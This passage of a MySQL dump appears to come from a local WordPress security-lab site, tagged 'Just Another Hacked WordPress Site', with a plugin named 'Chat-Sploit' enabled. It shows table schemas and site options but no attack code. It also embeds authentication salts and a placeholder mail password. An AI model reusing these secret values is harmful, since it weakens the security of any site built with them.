-- MySQL dump 10.13  Distrib 5.5.31, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: database_name_here
-- ------------------------------------------------------
-- Server version	5.5.31-0ubuntu0.13.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `wp_commentmeta`
--

DROP TABLE IF EXISTS `wp_commentmeta`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wp_commentmeta` (
  `meta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `comment_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `meta_key` varchar(255) DEFAULT NULL,
  `meta_value` longtext,
  PRIMARY KEY (`meta_id`),
  KEY `comment_id` (`comment_id`),
  KEY `meta_key` (`meta_key`)
) ENGINE=InnoDB AUTO_INCREMENT=249 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wp_commentmeta`
--

LOCK TABLES `wp_commentmeta` WRITE;
/*!40000 ALTER TABLE `wp_commentmeta` DISABLE KEYS */;
/*!40000 ALTER TABLE `wp_commentmeta` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wp_comments`
--

DROP TABLE IF EXISTS `wp_comments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wp_comments` (
  `comment_ID` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `comment_post_ID` bigint(20) unsigned NOT NULL DEFAULT '0',
  `comment_author` tinytext NOT NULL,
  `comment_author_email` varchar(100) NOT NULL DEFAULT '',
  `comment_author_url` varchar(200) NOT NULL DEFAULT '',
  `comment_author_IP` varchar(100) NOT NULL DEFAULT '',
  `comment_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `comment_date_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `comment_content` text NOT NULL,
  `comment_karma` int(11) NOT NULL DEFAULT '0',
  `comment_approved` varchar(20) NOT NULL DEFAULT '1',
  `comment_agent` varchar(255) NOT NULL DEFAULT '',
  `comment_type` varchar(20) NOT NULL DEFAULT '',
  `comment_parent` bigint(20) unsigned NOT NULL DEFAULT '0',
  `user_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`comment_ID`),
  KEY `comment_post_ID` (`comment_post_ID`),
  KEY `comment_approved_date_gmt` (`comment_approved`,`comment_date_gmt`),
  KEY `comment_date_gmt` (`comment_date_gmt`),
  KEY `comment_parent` (`comment_parent`)
) ENGINE=InnoDB AUTO_INCREMENT=125 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wp_comments`
--

LOCK TABLES `wp_comments` WRITE;
/*!40000 ALTER TABLE `wp_comments` DISABLE KEYS */;
/*!40000 ALTER TABLE `wp_comments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wp_links`
--

DROP TABLE IF EXISTS `wp_links`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wp_links` (
  `link_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `link_url` varchar(255) NOT NULL DEFAULT '',
  `link_name` varchar(255) NOT NULL DEFAULT '',
  `link_image` varchar(255) NOT NULL DEFAULT '',
  `link_target` varchar(25) NOT NULL DEFAULT '',
  `link_description` varchar(255) NOT NULL DEFAULT '',
  `link_visible` varchar(20) NOT NULL DEFAULT 'Y',
  `link_owner` bigint(20) unsigned NOT NULL DEFAULT '1',
  `link_rating` int(11) NOT NULL DEFAULT '0',
  `link_updated` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `link_rel` varchar(255) NOT NULL DEFAULT '',
  `link_notes` mediumtext NOT NULL,
  `link_rss` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`link_id`),
  KEY `link_visible` (`link_visible`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wp_links`
--

LOCK TABLES `wp_links` WRITE;
/*!40000 ALTER TABLE `wp_links` DISABLE KEYS */;
/*!40000 ALTER TABLE `wp_links` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wp_options`
--

DROP TABLE IF EXISTS `wp_options`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wp_options` (
  `option_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `option_name` varchar(64) NOT NULL DEFAULT '',
  `option_value` longtext NOT NULL,
  `autoload` varchar(20) NOT NULL DEFAULT 'yes',
  PRIMARY KEY (`option_id`),
  UNIQUE KEY `option_name` (`option_name`)
) ENGINE=InnoDB AUTO_INCREMENT=309 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wp_options`
--

LOCK TABLES `wp_options` WRITE;
/*!40000 ALTER TABLE `wp_options` DISABLE KEYS */;
INSERT INTO `wp_options` VALUES (1,'siteurl','http://127.0.0.1:9080/wordpress','yes'),(2,'blogname','Security','yes'),(3,'blogdescription','Just Another Hacked WordPress Site','yes'),(4,'users_can_register','0','yes'),(5,'admin_email','mike@automattic.com','yes'),(6,'start_of_week','1','yes'),(7,'use_balanceTags','0','yes'),(8,'use_smilies','1','yes'),(9,'require_name_email','1','yes'),(10,'comments_notify','','yes'),(11,'posts_per_rss','10','yes'),(12,'rss_use_excerpt','0','yes'),(13,'mailserver_url','mail.example.com','yes'),(14,'mailserver_login','login@example.com','yes'),(15,'mailserver_pass','password','yes'),(16,'mailserver_port','110','yes'),(17,'default_category','1','yes'),(18,'default_comment_status','open','yes'),(19,'default_ping_status','closed','yes'),(20,'default_pingback_flag','','yes'),(21,'posts_per_page','10','yes'),(22,'date_format','F j, Y','yes'),(23,'time_format','H:i','yes'),(24,'links_updated_date_format','F j, Y g:i a','yes'),(25,'links_recently_updated_prepend','<em>','yes'),(26,'links_recently_updated_append','</em>','yes'),(27,'links_recently_updated_time','120','yes'),(28,'comment_moderation','','yes'),(29,'moderation_notify','','yes'),(30,'permalink_structure','/%year%/%monthnum%/%day%/%postname%/','yes'),(31,'gzipcompression','0','yes'),(32,'hack_file','0','yes'),(33,'blog_charset','UTF-8','yes'),(34,'moderation_keys','','no'),(35,'active_plugins','a:3:{i:0;s:26:\"Chat-Sploit/chatsploit.php\";i:1;s:29:\"highlight.js/highlight-js.php\";i:2;s:21:\"mdawaffe/mdawaffe.php\";}','yes'),(36,'home','http://127.0.0.1:9080/wordpress','yes'),(37,'category_base','','yes'),(38,'ping_sites','http://rpc.pingomatic.com/','yes'),(39,'advanced_edit','0','yes'),(40,'comment_max_links','2','yes'),(41,'gmt_offset','','yes'),(42,'default_email_category','1','yes'),(43,'recently_edited','','no'),(44,'template','twentytwelve','yes'),(45,'stylesheet','twentytwelve','yes'),(46,'comment_whitelist','1','yes'),(47,'blacklist_keys','','no'),(48,'comment_registration','','yes'),(49,'html_type','text/html','yes'),(50,'use_trackback','0','yes'),(51,'default_role','subscriber','yes'),(52,'db_version','23588','yes'),(53,'uploads_use_yearmonth_folders','1','yes'),(54,'upload_path','','yes'),(55,'blog_public','0','yes'),(56,'default_link_category','2','yes'),(57,'show_on_front','page','yes'),(58,'tag_base','','yes'),(59,'show_avatars','1','yes'),(60,'avatar_rating','G','yes'),(61,'upload_url_path','','yes'),(62,'thumbnail_size_w','150','yes'),(63,'thumbnail_size_h','150','yes'),(64,'thumbnail_crop','1','yes'),(65,'medium_size_w','300','yes'),(66,'medium_size_h','300','yes'),(67,'avatar_default','mystery','yes'),(68,'large_size_w','1024','yes'),(69,'large_size_h','1024','yes'),(70,'image_default_link_type','file','yes'),(71,'image_default_size','','yes'),(72,'image_default_align','','yes'),(73,'close_comments_for_old_posts','','yes'),(74,'close_comments_days_old','14','yes'),(75,'thread_comments','1','yes'),(76,'thread_comments_depth','5','yes'),(77,'page_comments','','yes'),(78,'comments_per_page','50','yes'),(79,'default_comments_page','newest','yes'),(80,'comment_order','asc','yes'),(81,'sticky_posts','a:0:{}','yes'),(82,'widget_categories','a:1:{s:12:\"_multiwidget\";i:1;}','yes'),(83,'widget_text','a:0:{}','yes'),(84,'widget_rss','a:0:{}','yes'),(85,'uninstall_plugins','a:0:{}','no'),(86,'timezone_string','UTC','yes'),(88,'page_on_front','7','yes'),(89,'default_post_format','0','yes'),(90,'link_manager_enabled','0','yes'),(91,'initial_db_version','22441','yes'),(92,'wp_user_roles','a:5:{s:13:\"administrator\";a:2:{s:4:\"name\";s:13:\"Administrator\";s:12:\"capabilities\";a:62:{s:13:\"switch_themes\";b:1;s:11:\"edit_themes\";b:1;s:16:\"activate_plugins\";b:1;s:12:\"edit_plugins\";b:1;s:10:\"edit_users\";b:1;s:10:\"edit_files\";b:1;s:14:\"manage_options\";b:1;s:17:\"moderate_comments\";b:1;s:17:\"manage_categories\";b:1;s:12:\"manage_links\";b:1;s:12:\"upload_files\";b:1;s:6:\"import\";b:1;s:15:\"unfiltered_html\";b:1;s:10:\"edit_posts\";b:1;s:17:\"edit_others_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:10:\"edit_pages\";b:1;s:4:\"read\";b:1;s:8:\"level_10\";b:1;s:7:\"level_9\";b:1;s:7:\"level_8\";b:1;s:7:\"level_7\";b:1;s:7:\"level_6\";b:1;s:7:\"level_5\";b:1;s:7:\"level_4\";b:1;s:7:\"level_3\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:17:\"edit_others_pages\";b:1;s:20:\"edit_published_pages\";b:1;s:13:\"publish_pages\";b:1;s:12:\"delete_pages\";b:1;s:19:\"delete_others_pages\";b:1;s:22:\"delete_published_pages\";b:1;s:12:\"delete_posts\";b:1;s:19:\"delete_others_posts\";b:1;s:22:\"delete_published_posts\";b:1;s:20:\"delete_private_posts\";b:1;s:18:\"edit_private_posts\";b:1;s:18:\"read_private_posts\";b:1;s:20:\"delete_private_pages\";b:1;s:18:\"edit_private_pages\";b:1;s:18:\"read_private_pages\";b:1;s:12:\"delete_users\";b:1;s:12:\"create_users\";b:1;s:17:\"unfiltered_upload\";b:1;s:14:\"edit_dashboard\";b:1;s:14:\"update_plugins\";b:1;s:14:\"delete_plugins\";b:1;s:15:\"install_plugins\";b:1;s:13:\"update_themes\";b:1;s:14:\"install_themes\";b:1;s:11:\"update_core\";b:1;s:10:\"list_users\";b:1;s:12:\"remove_users\";b:1;s:9:\"add_users\";b:1;s:13:\"promote_users\";b:1;s:18:\"edit_theme_options\";b:1;s:13:\"delete_themes\";b:1;s:6:\"export\";b:1;}}s:6:\"editor\";a:2:{s:4:\"name\";s:6:\"Editor\";s:12:\"capabilities\";a:34:{s:17:\"moderate_comments\";b:1;s:17:\"manage_categories\";b:1;s:12:\"manage_links\";b:1;s:12:\"upload_files\";b:1;s:15:\"unfiltered_html\";b:1;s:10:\"edit_posts\";b:1;s:17:\"edit_others_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:10:\"edit_pages\";b:1;s:4:\"read\";b:1;s:7:\"level_7\";b:1;s:7:\"level_6\";b:1;s:7:\"level_5\";b:1;s:7:\"level_4\";b:1;s:7:\"level_3\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:17:\"edit_others_pages\";b:1;s:20:\"edit_published_pages\";b:1;s:13:\"publish_pages\";b:1;s:12:\"delete_pages\";b:1;s:19:\"delete_others_pages\";b:1;s:22:\"delete_published_pages\";b:1;s:12:\"delete_posts\";b:1;s:19:\"delete_others_posts\";b:1;s:22:\"delete_published_posts\";b:1;s:20:\"delete_private_posts\";b:1;s:18:\"edit_private_posts\";b:1;s:18:\"read_private_posts\";b:1;s:20:\"delete_private_pages\";b:1;s:18:\"edit_private_pages\";b:1;s:18:\"read_private_pages\";b:1;}}s:6:\"author\";a:2:{s:4:\"name\";s:6:\"Author\";s:12:\"capabilities\";a:10:{s:12:\"upload_files\";b:1;s:10:\"edit_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:4:\"read\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:12:\"delete_posts\";b:1;s:22:\"delete_published_posts\";b:1;}}s:11:\"contributor\";a:2:{s:4:\"name\";s:11:\"Contributor\";s:12:\"capabilities\";a:5:{s:10:\"edit_posts\";b:1;s:4:\"read\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:12:\"delete_posts\";b:1;}}s:10:\"subscriber\";a:2:{s:4:\"name\";s:10:\"Subscriber\";s:12:\"capabilities\";a:2:{s:4:\"read\";b:1;s:7:\"level_0\";b:1;}}}','yes'),(93,'widget_search','a:1:{s:12:\"_multiwidget\";i:1;}','yes'),(94,'widget_recent-posts','a:1:{s:12:\"_multiwidget\";i:1;}','yes'),(95,'widget_recent-comments','a:1:{s:12:\"_multiwidget\";i:1;}','yes'),(96,'widget_archives','a:1:{s:12:\"_multiwidget\";i:1;}','yes'),(97,'widget_meta','a:1:{s:12:\"_multiwidget\";i:1;}','yes'),(98,'sidebars_widgets','a:5:{s:19:\"wp_inactive_widgets\";a:0:{}s:9:\"sidebar-1\";a:1:{i:0;s:13:\"chat_sploit-2\";}s:9:\"sidebar-2\";a:0:{}s:9:\"sidebar-3\";a:0:{}s:13:\"array_version\";i:3;}','yes'),(99,'cron','a:4:{i:1367833938;a:3:{s:16:\"wp_version_check\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:10:\"twicedaily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:43200;}}s:17:\"wp_update_plugins\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:10:\"twicedaily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:43200;}}s:16:\"wp_update_themes\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:10:\"twicedaily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:43200;}}}i:1367833944;a:1:{s:19:\"wp_scheduled_delete\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:5:\"daily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:86400;}}}i:1367871917;a:1:{s:30:\"wp_scheduled_auto_draft_delete\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:5:\"daily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:86400;}}}s:7:\"version\";i:2;}','yes'),(108,'dashboard_widget_options','a:4:{s:25:\"dashboard_recent_comments\";a:1:{s:5:\"items\";i:5;}s:24:\"dashboard_incoming_links\";a:5:{s:4:\"home\";s:31:\"http://127.0.0.1:9080/wordpress\";s:4:\"link\";s:107:\"http://blogsearch.google.com/blogsearch?scoring=d&partner=wordpress&q=link:http://127.0.0.1:9080/wordpress/\";s:3:\"url\";s:140:\"http://blogsearch.google.com/blogsearch_feeds?scoring=d&ie=utf-8&num=10&output=rss&partner=wordpress&q=link:http://127.0.0.1:9080/wordpress/\";s:5:\"items\";i:10;s:9:\"show_date\";b:0;}s:17:\"dashboard_primary\";a:7:{s:4:\"link\";s:26:\"http://wordpress.org/news/\";s:3:\"url\";s:31:\"http://wordpress.org/news/feed/\";s:5:\"title\";s:14:\"WordPress Blog\";s:5:\"items\";i:2;s:12:\"show_summary\";i:1;s:11:\"show_author\";i:0;s:9:\"show_date\";i:1;}s:19:\"dashboard_secondary\";a:7:{s:4:\"link\";s:28:\"http://planet.wordpress.org/\";s:3:\"url\";s:33:\"http://planet.wordpress.org/feed/\";s:5:\"title\";s:20:\"Other WordPress News\";s:5:\"items\";i:5;s:12:\"show_summary\";i:0;s:11:\"show_author\";i:0;s:9:\"show_date\";i:0;}}','yes'),(141,'nonce_salt','AHf<TA=_?)j oGskLav9iLd~3MU#Xyw1sG;n_9CN>pt}cVfzzTa%gVl1gZ +V}5 ','yes'),(142,'auth_salt','~wge)mV3)pxZVchI=.$iUD[PGpj`_FU_/^y;NdJSUXm>z*9ZS0Mo7~EnGk@;5WH,','yes'),(143,'logged_in_salt','ME-}y,UYW17G4}ssx?^Wd9ES~N;(1)hI`]ZVFY:)5Ry:Uz?Z^P>.B&7S)o+4(VrT','yes'),(144,'db_upgraded','','yes'),(168,'can_compress_scripts','1','yes'),(181,'category_children','a:0:{}','yes'),(185,'current_theme','Twenty Twelve','yes'),(187,'theme_switched','','yes'),(188,'theme_mods_twentytwelve','a:7:{s:16:\"header_textcolor\";s:5:\"blank\";s:16:\"background_color\";s:6:\"e6e6e6\";s:16:\"background_image\";s:0:\"\";s:17:\"background_repeat\";s:6:\"repeat\";s:21:\"background_position_x\";s:4:\"left\";s:21:\"background_attachment\";s:5:\"fixed\";s:18:\"nav_menu_locations\";a:1:{s:7:\"primary\";i:3;}}','yes'),(189,'recently_activated','a:2:{s:39:\"syntaxhighlighter/syntaxhighlighter.php\";i:1367715571;s:34:\"wp-highlightjs/wp_highlight.js.php\";i:1367707926;}','yes'),(190,'chat_sploit_post','5','yes'),(191,'widget_chat_sploit','a:2:{i:2;a:1:{s:5:\"title\";s:12:\"Chat Sploit!\";}s:12:\"_multiwidget\";i:1;}','yes'),(197,'nav_menu_options','a:2:{i:0;b:0;s:8:\"auto_add\";a:0:{}}','yes'),(198,'page_for_posts','0','yes'),(199,'rewrite_rules','a:71:{s:47:\"category/(.+?)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:52:\"index.php?category_name=$matches[1]&feed=$matches[2]\";s:42:\"category/(.+?)/(feed|rdf|rss|rss2|atom)/?$\";s:52:\"index.php?category_name=$matches[1]&feed=$matches[2]\";s:35:\"category/(.+?)/page/?([0-9]{1,})/?$\";s:53:\"index.php?category_name=$matches[1]&paged=$matches[2]\";s:17:\"category/(.+?)/?$\";s:35:\"index.php?category_name=$matches[1]\";s:44:\"tag/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.php?tag=$matches[1]&feed=$matches[2]\";s:39:\"tag/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.php?tag=$matches[1]&feed=$matches[2]\";s:32:\"tag/([^/]+)/page/?([0-9]{1,})/?$\";s:43:\"index.php?tag=$matches[1]&paged=$matches[2]\";s:14:\"tag/([^/]+)/?$\";s:25:\"index.php?tag=$matches[1]\";s:45:\"type/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?post_format=$matches[1]&feed=$matches[2]\";s:40:\"type/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?post_format=$matches[1]&feed=$matches[2]\";s:33:\"type/([^/]+)/page/?([0-9]{1,})/?$\";s:51:\"index.php?post_format=$matches[1]&paged=$matches[2]\";s:15:\"type/([^/]+)/?$\";s:33:\"index.php?post_format=$matches[1]\";s:48:\".*wp-(atom|rdf|rss|rss2|feed|commentsrss2)\\.php$\";s:18:\"index.php?feed=old\";s:20:\".*wp-app\\.php(/.*)?$\";s:19:\"index.php?error=403\";s:18:\".*wp-register.php$\";s:23:\"index.php?register=true\";s:32:\"feed/(feed|rdf|rss|rss2|atom)/?$\";s:27:\"index.php?&feed=$matches[1]\";s:27:\"(feed|rdf|rss|rss2|atom)/?$\";s:27:\"index.php?&feed=$matches[1]\";s:20:\"page/?([0-9]{1,})/?$\";s:28:\"index.php?&paged=$matches[1]\";s:27:\"comment-page-([0-9]{1,})/?$\";s:38:\"index.php?&page_id=7&cpage=$matches[1]\";s:41:\"comments/feed/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.php?&feed=$matches[1]&withcomments=1\";s:36:\"comments/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.php?&feed=$matches[1]&withcomments=1\";s:44:\"search/(.+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:40:\"index.php?s=$matches[1]&feed=$matches[2]\";s:39:\"search/(.+)/(feed|rdf|rss|rss2|atom)/?$\";s:40:\"index.php?s=$matches[1]&feed=$matches[2]\";s:32:\"search/(.+)/page/?([0-9]{1,})/?$\";s:41:\"index.php?s=$matches[1]&paged=$matches[2]\";s:14:\"search/(.+)/?$\";s:23:\"index.php?s=$matches[1]\";s:47:\"author/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?author_name=$matches[1]&feed=$matches[2]\";s:42:\"author/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?author_name=$matches[1]&feed=$matches[2]\";s:35:\"author/([^/]+)/page/?([0-9]{1,})/?$\";s:51:\"index.php?author_name=$matches[1]&paged=$matches[2]\";s:17:\"author/([^/]+)/?$\";s:33:\"index.php?author_name=$matches[1]\";s:69:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/feed/(feed|rdf|rss|rss2|atom)/?$\";s:80:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&feed=$matches[4]\";s:64:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/(feed|rdf|rss|rss2|atom)/?$\";s:80:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&feed=$matches[4]\";s:57:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/page/?([0-9]{1,})/?$\";s:81:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&paged=$matches[4]\";s:39:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/?$\";s:63:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]\";s:56:\"([0-9]{4})/([0-9]{1,2})/feed/(feed|rdf|rss|rss2|atom)/?$\";s:64:\"index.php?year=$matches[1]&monthnum=$matches[2]&feed=$matches[3]\";s:51:\"([0-9]{4})/([0-9]{1,2})/(feed|rdf|rss|rss2|atom)/?$\";s:64:\"index.php?year=$matches[1]&monthnum=$matches[2]&feed=$matches[3]\";s:44:\"([0-9]{4})/([0-9]{1,2})/page/?([0-9]{1,})/?$\";s:65:\"index.php?year=$matches[1]&monthnum=$matches[2]&paged=$matches[3]\";s:26:\"([0-9]{4})/([0-9]{1,2})/?$\";s:47:\"index.php?year=$matches[1]&monthnum=$matches[2]\";s:43:\"([0-9]{4})/feed/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?year=$matches[1]&feed=$matches[2]\";s:38:\"([0-9]{4})/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?year=$matches[1]&feed=$matches[2]\";s:31:\"([0-9]{4})/page/?([0-9]{1,})/?$\";s:44:\"index.php?year=$matches[1]&paged=$matches[2]\";s:13:\"([0-9]{4})/?$\";s:26:\"index.php?year=$matches[1]\";s:58:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/attachment/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:68:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/attachment/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:88:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/attachment/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:83:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/attachment/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:83:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/attachment/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:57:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)/trackback/?$\";s:85:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&name=$matches[4]&tb=1\";s:77:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:97:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&name=$matches[4]&feed=$matches[5]\";s:72:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:97:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&name=$matches[4]&feed=$matches[5]\";s:65:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)/page/?([0-9]{1,})/?$\";s:98:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&name=$matches[4]&paged=$matches[5]\";s:72:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)/comment-page-([0-9]{1,})/?$\";s:98:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&name=$matches[4]&cpage=$matches[5]\";s:57:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)(/[0-9]+)?/?$\";s:97:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&name=$matches[4]&page=$matches[5]\";s:47:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:57:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:77:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:72:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:72:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:64:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/comment-page-([0-9]{1,})/?$\";s:81:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&cpage=$matches[4]\";s:51:\"([0-9]{4})/([0-9]{1,2})/comment-page-([0-9]{1,})/?$\";s:65:\"index.php?year=$matches[1]&monthnum=$matches[2]&cpage=$matches[3]\";s:38:\"([0-9]{4})/comment-page-([0-9]{1,})/?$\";s:44:\"index.php?year=$matches[1]&cpage=$matches[2]\";s:27:\".?.+?/attachment/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:37:\".?.+?/attachment/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:57:\".?.+?/attachment/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:52:\".?.+?/attachment/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:52:\".?.+?/attachment/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:20:\"(.?.+?)/trackback/?$\";s:35:\"index.php?pagename=$matches[1]&tb=1\";s:40:\"(.?.+?)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:47:\"index.php?pagename=$matches[1]&feed=$matches[2]\";s:35:\"(.?.+?)/(feed|rdf|rss|rss2|atom)/?$\";s:47:\"index.php?pagename=$matches[1]&feed=$matches[2]\";s:28:\"(.?.+?)/page/?([0-9]{1,})/?$\";s:48:\"index.php?pagename=$matches[1]&paged=$matches[2]\";s:35:\"(.?.+?)/comment-page-([0-9]{1,})/?$\";s:48:\"index.php?pagename=$matches[1]&cpage=$matches[2]\";s:20:\"(.?.+?)(/[0-9]+)?/?$\";s:47:\"index.php?pagename=$matches[1]&page=$matches[2]\";}','yes');
/*!40000 ALTER TABLE `wp_options` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wp_postmeta`
--

DROP TABLE IF EXISTS `wp_postmeta`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `wp_postmeta` (
  `meta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `post_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `meta_key` varchar(255) DEFAULT NULL,
  `meta_value` longtext,
  PRIMARY KEY (`meta_id`),
